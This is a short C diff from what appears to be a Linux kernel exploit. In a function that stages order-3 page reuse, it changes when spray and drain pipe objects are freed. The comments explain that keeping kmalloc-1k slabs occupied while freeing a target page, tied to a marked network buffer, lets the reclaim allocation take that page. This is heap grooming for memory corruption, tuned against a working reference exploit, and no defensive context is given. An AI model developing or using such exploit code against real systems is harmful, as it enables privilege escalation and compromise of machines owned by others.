@@ -248,13 +248,10 @@ static int pipe_stage_exact_order3(uintptr_t base,
       allocated++;
   }
 
-  /* The drain pipes have already consumed the old kmalloc-1k partials.
-   * Shrink them while the probe still pins the target, then release the
-   * target last. Reclaim growth first reuses those old slabs and should take
-   * the now-newest order-3 page on its next slab allocation. */
-  for (size_t i = 0; i < PIPE_DRAIN; i++)
-    free_pipe_object(pipe_fds_drain[i]);
-
+  /* Keep the drain arrays allocated while releasing the marked skb and
+   * growing the reclaim population. This matches the successful standalone
+   * reference ordering: the target order-3 page is freed while existing
+   * kmalloc-1k slabs remain occupied, so reclaim growth can consume it. */
   int drained = pipe_drain_order3_probe(state, captured);
   close(state->probes[captured].sv[0]);
   close(state->probes[captured].sv[1]);
